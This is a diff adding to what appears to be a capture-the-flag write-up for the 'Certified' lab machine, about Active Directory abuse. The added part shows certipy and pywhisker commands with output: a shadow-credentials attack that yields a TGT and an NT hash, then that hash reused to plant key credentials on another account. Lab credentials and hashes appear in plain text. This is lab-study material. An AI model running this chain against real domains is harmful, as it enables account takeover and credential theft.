@@ -66,3 +66,34 @@ Management_svc user has GenericAll rights on CA_Operator. Therefore we can now c
 ```
 pywhisker -d "certified.htb" -u "management_svc" -p "JHMLsBj7SBhwkWOKu5QV" -t "management_svc" -a "add
 ```
+
+
+
+```
+❯ certipy auth -pfx mmgt_svc.pfx -username 'management_svc'  -domain 'certified.htb' -dc-ip 10.129.73.100
+Certipy v4.8.2 - by Oliver Lyak (ly4k)
+
+[!] Could not find identification in the provided certificate
+[*] Using principal: management_svc@certified.htb
+[*] Trying to get TGT...
+[*] Got TGT
+[*] Saved credential cache to 'management_svc.ccache'
+[*] Trying to retrieve NT hash for 'management_svc'
+[*] Got hash for 'management_svc@certified.htb': aad3b435b51404eeaad3b435b51404ee:a091c1832bcdd4677c28b5a6a1295584
+```
+
+```
+pywhisker -d "certified.htb" -u "management_svc" -H aad3b435b51404eeaad3b435b51404ee:a091c1832bcdd4677c28b5a6a1295584 -t "ca_operator" -a "add"
+[*] Searching for the target account
+[*] Target user found: CN=operator ca,CN=Users,DC=certified,DC=htb
+[*] Generating certificate
+[*] Certificate generated
+[*] Generating KeyCredential
+[*] KeyCredential generated with DeviceID: 077b952c-0022-2c06-e298-014ae032b1ae
+[*] Updating the msDS-KeyCredentialLink attribute of ca_operator
+[+] Updated the msDS-KeyCredentialLink attribute of the target object
+[+] Saved PFX (#PKCS12) certificate & key at path: HOEE0Xqo.pfx
+[*] Must be used with password: 1xMrCb09Xclpdspr5BBI
+[*] A TGT can now be obtained with https://github.com/dirkjanm/PKINITtools
+```
+
